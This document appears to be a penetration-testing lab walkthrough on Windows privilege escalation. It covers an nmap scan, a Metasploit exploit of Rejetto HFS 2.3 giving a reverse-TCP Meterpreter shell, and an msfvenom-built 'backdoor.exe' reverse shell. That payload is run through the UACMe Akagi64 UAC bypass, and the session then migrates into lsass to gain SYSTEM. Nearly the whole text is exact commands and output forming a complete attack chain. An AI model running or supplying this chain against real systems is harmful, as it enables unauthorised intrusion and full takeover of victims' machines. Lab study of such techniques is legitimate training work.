# Bypassing UAC

In order to Bypass UAC we need to have user account that is part of `Local Administrators Group` on target machine

# Tools 

There are various tools depending on windows versions

# `UACMe` 
https://github.com/hfiref0x/UACME

`UACMe` is a open source robust Privilege Escalation Tool developed by hirefox,  it can be used with windows to bypass UAC with various techniques

The Git repository provides range of methods with 60 more than exploits to bypass UAC from windows 7 to win 10

It allows attacker to execute malicious payloads on windows with elevated privileges by abusing windows inbuilt tool called  `Windows AutoElevate Tool`

It provides us an executable that can be transfered on to the target system, and that executable can be use to execute any privileged program on target

**********************************************************************************************************************************************
# Firstly we need to find some vulnerability and get the intial access to the target machine by some exploit

oot@attackdefense:~# `nmap 10.5.28.129 `  
Starting Nmap 7.91 ( https://nmap.org ) at 2023-12-22 11:14 IST
Nmap scan report for 10.5.28.129
Host is up (0.0018s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown

root@attackdefense:~# `nmap 10.5.28.129 -p 80,445,3389 -sC -sV`
Starting Nmap 7.91 ( https://nmap.org ) at 2023-12-22 11:30 IST
Nmap scan report for 10.5.28.129
Host is up (0.0020s latency).

PORT     STATE SERVICE            VERSION
80/tcp   open  http               HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
445/tcp  open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: VICTIM
|   NetBIOS_Domain_Name: VICTIM
|   NetBIOS_Computer_Name: VICTIM
|   DNS_Domain_Name: victim
|   DNS_Computer_Name: victim
|   Product_Version: 6.3.9600
|_  System_Time: 2023-12-22T06:01:27+00:00
| ssl-cert: Subject: commonName=victim
| Not valid before: 2023-12-21T05:44:31
|_Not valid after:  2024-06-21T05:44:31
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-12-22T06:01:31
|_  start_date: 2023-12-22T05:43:10

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.38 seconds

# We notice that there is a `HTTP File Server HFS on port 80` of version `httpd 2.3`, if we search about it we came to know about that it is the `Rejetto HTTP Server` and `2.3` has various exploits available , Lets check metasploit to find some exploit 

Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)  - `https://www.exploit-db.com/exploits/39161`


msf6 > `setg RHOSTS 10.5.28.129`
RHOSTS => 10.5.28.129
msf6 > `search Rejetto`

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec
msf6 > `use 0`
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > `options`

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.5.28.129      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.12.3       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/http/rejetto_hfs_exec) > `exploit`

[*] Started reverse TCP handler on 10.10.12.3:4444 
[*] Using URL: http://0.0.0.0:8080/wCM05Yv
[*] Local IP: http://10.10.12.3:8080/wCM05Yv
[*] Server started.
[*] Sending a malicious request to /
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
[*] Payload request received: /wCM05Yv
[*] Sending stage (175174 bytes) to 10.5.28.129
[*] Meterpreter session 1 opened (10.10.12.3:4444 -> 10.5.28.129:49351) at 2023-12-22 11:50:27 +0530
[!] Tried to delete %TEMP%\BJMlwgqFQ.vbs, unknown result
[*] Server stopped.

meterpreter > `sysinfo`
Computer        : VICTIM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > 

# We see have windows 2012, but one problem here is that computer is 64 bit (`Architecture    : x64`) however the meterpreter session is running on `x86/windows` which means a 32 bit session, so now we need to migrate to a 64 bit session by migrating to another 64 bit process on target machine 

meterpreter > `ps`

Process List
============

 PID   PPID  Name                  Arch  Session  User          Path
 ---   ----  ----                  ----  -------  ----          ----
 0     0     [System Process]                                   
 4     0     System                                             
 240   4     smss.exe                                           
 272   488   svchost.exe                                        
 308   488   spoolsv.exe                                        
 332   324   csrss.exe                                          
 396   388   csrss.exe                                          
 404   324   wininit.exe                                        
 448   388   winlogon.exe                                       
 488   404   services.exe                                       
 496   404   lsass.exe                                          
 556   488   svchost.exe                                        
 572   488   amazon-ssm-agent.exe                               
 588   488   svchost.exe                                        
 676   488   svchost.exe                                        
 696   448   dwm.exe                                            
 724   488   svchost.exe                                        
 760   488   svchost.exe                                        
 844   488   svchost.exe                                        
 1000  488   svchost.exe                                        
 1072  488   svchost.exe                                        
 1144  488   Ec2Config.exe                                      
 1480  556   WmiPrvSE.exe                                       
 1876  488   svchost.exe                                        
 1916  2740  wscript.exe           x86   1        VICTIM\admin  C:\Windows\SysWOW64\wscript.exe
 2008  488   svchost.exe                                        
 2140  724   taskhostex.exe        x64   1        VICTIM\admin  C:\Windows\System32\taskhostex.exe
 2236  2180  explorer.exe          x64   1        VICTIM\admin  C:\Windows\explorer.exe
 2520  2928  cmd.exe               x86   1        VICTIM\admin  C:\Windows\SysWOW64\cmd.exe
 2740  2236  hfs.exe               x86   1        VICTIM\admin  C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hfs.exe
 2864  2520  conhost.exe           x64   1        VICTIM\admin  C:\Windows\System32\conhost.exe
 2908  488   msdtc.exe                                          
 2928  1916  pqSJhJvi.exe          x86   1        VICTIM\admin  C:\Users\admin\AppData\Local\Temp\1\rad919CA.tmp\pqSJhJvi.exe

meterpreter > `pgrep explorer`
2236
meterpreter > 

# Migrating to explorer process (note migrating also helps to have persistence)

meterpreter > `migrate 2236`
[*] Migrating from 2928 to 2236...
[*] Migration completed successfully.
meterpreter > `sysinfo`
Computer        : VICTIM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > 

# checking if user is privileged, we observe that we have `admin` user but its not the `administrator` user,

meterpreter > `getuid`
Server username: VICTIM\admin
meterpreter > `getprivs`

# Checking privileges, we observe that user is not having any privileges but that dosent mean user cant run process as admininstrators

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > 

# Checking if user is part of Local Administrator Group by `command shell`, we found that there are only 2 users and yes admin user is part of local admin group

meterpreter > `shell`
Process 652 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>`net users`
net users

User accounts for \\VICTIM

-------------------------------------------------------------------------------
admin                    Administrator            Guest                    
The command completed successfully.


C:\Windows\system32>`net localgroup administrators   `                   
net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
admin
Administrator
The command completed successfully.


C:\Windows\system32>

# This means `admin` user can run programs with elevated privileges but needs to bypass UAC, For example we try to change password using command shell we are given `acces is denied`,  this is because we cant give the consent of prmopt using command shell unless we bypass UAC

C:\Windows\system32>`net user admin password123`
net user admin password123
System error 5 has occurred.

Access is denied.


C:\Windows\system32>

# Now we need to upload the executable ie `Akagai` to target, we already have this executable file in lab env, or else we can clone the git repo

# But wait. we use this executable to run our payload on the target machine bypassing UAC, so first we need to create our payload and upload it to target machine

# We first create our payload using `msfvenom`, and start listening on port 1234 using `multi/handler` on diffrent msfcosole

Root@attackdefense:~# `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.19.5 LPORT=1234 -f exe > backdoor.exe`
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
root@attackdefense:~# `ls`
Desktop  backdoor.exe  thinclient_drives
root@attackdefense:~# 

msf6 > `use multi/handler`
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > `set payload windows/meterpreter/reverse_tcp`
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > `set LPORT 1234`
LPORT => 1234
msf6 exploit(multi/handler) > `set LHOST 10.10.19.5`
LHOST => 10.10.19.5
msf6 exploit(multi/handler) > `run`

[*] Started reverse TCP handler on 10.10.19.5:1234 


# So if we see currenly we dont have much privileges in our existing meterpreter session

C:\Windows\system32>`^C`
Terminate channel 1? [y/N]  y
meterpreter > `pwd`
C:\Windows\system32
meterpreter > `getuid`
Server username: VICTIM\admin
meterpreter > `getprivs`

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

# Now we will upload both our payload backdoor.exe and the akagi64 executable in a temp dir

meterpreter > `cd C://`
meterpreter > `mkdir temp`
Creating directory: temp
meterpreter > `cd temp`
meterpreter > `upload backdoor.exe`
[*] uploading  : /root/backdoor.exe -> backdoor.exe
[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): /root/backdoor.exe -> backdoor.exe
[*] uploaded   : /root/backdoor.exe -> backdoor.exe
meterpreter > `upload /root/Desktop/tools/UACME/Akagi64.exe`
[*] uploading  : /root/Desktop/tools/UACME/Akagi64.exe -> Akagi64.exe
[*] Uploaded 194.50 KiB of 194.50 KiB (100.0%): /root/Desktop/tools/UACME/Akagi64.exe -> Akagi64.exe
[*] uploaded   : /root/Desktop/tools/UACME/Akagi64.exe -> Akagi64.exe
meterpreter > `shell`
C:\temp>`dir`
dir
 Volume in drive C has no label.
 Volume Serial Number is AEDF-99BD

 Directory of C:\temp

12/22/2023  09:38 AM    <DIR>          .
12/22/2023  09:38 AM    <DIR>          ..
12/22/2023  09:38 AM           199,168 Akagi64.exe
12/22/2023  09:37 AM            73,802 backdoor.exe
               2 File(s)        272,970 bytes
               2 Dir(s)   8,273,616,896 bytes free

# Now we see have both uploaded and when we execute the akagi with backdoor.exe as parameter, we observe that there is response in our listerner which we already set on diffrent terminal

# Note that we used key `23` from the key list provided in github repo because this is not fixed on windows

C:\temp>`.\Akagi64 23 C:\temp\backdoor.exe`
.\Akagi64 23 C:\temp\backdoor.exe

C:\temp>

# On our listerner on another terminal we finally have response and a new meterpreter session, we observe that although we still have same user but we now have more privileges, using these additional privileges we will be able to migrate to a process running on higher privilege

[*] Started reverse TCP handler on 10.10.19.5:1234 
[*] Sending stage (175174 bytes) to 10.5.23.210
[*] Meterpreter session 1 opened (10.10.19.5:1234 -> 10.5.23.210:49307) at 2023-12-22 15:12:26 +0530

meterpreter > `getuid`
Server username: VICTIM\admin
meterpreter > `getprivs`

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > 

# Now if we list out process we will get much more privileged process on which we can migrate compared to process list we had with previous user

meterpreter > `ps`

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]                                                   
 4     0     System                x64   0                                      
 116   2900  conhost.exe           x64   1        VICTIM\admin                  C:\Windows\System32\conhost.exe
 368   4     smss.exe              x64   0                                      
 500   692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 528   2216  backdoor.exe          x86   1        VICTIM\admin                  C:\temp\backdoor.exe
 532   524   csrss.exe             x64   0                                      
 600   592   csrss.exe             x64   1                                      
 608   524   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 636   592   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 692   608   services.exe          x64   0                                      
 700   608   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 760   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 772   692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 792   692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 872   636   dwm.exe               x64   1        Window Manager\DWM-1          C:\Windows\System32\dwm.exe
 888   692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 920   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 964   692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1148  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1196  692   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1248  692   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
 1272  692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1348  692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1360  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1412  692   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1732  760   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
 1836  2728  hfs.exe               x86   1        VICTIM\admin                  C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hfs.exe
 1888  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 2428  692   msdtc.exe             x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\msdtc.exe
 2668  920   taskhostex.exe        x64   1        VICTIM\admin                  C:\Windows\System32\taskhostex.exe
 2728  2704  explorer.exe          x64   1        VICTIM\admin                  C:\Windows\explorer.exe
 2900  1900  cmd.exe               x86   1        VICTIM\admin                  C:\Windows\SysWOW64\cmd.exe

meterpreter > 

# we will migrate to process with NT Authority\System and Boom we have Highest Privileges Now!!!!

meterpreter > `migrate 700`
[*] Migrating from 528 to 700...
[*] Migration completed successfully.
meterpreter > `getuid`
Server username: NT AUTHORITY\SYSTEM



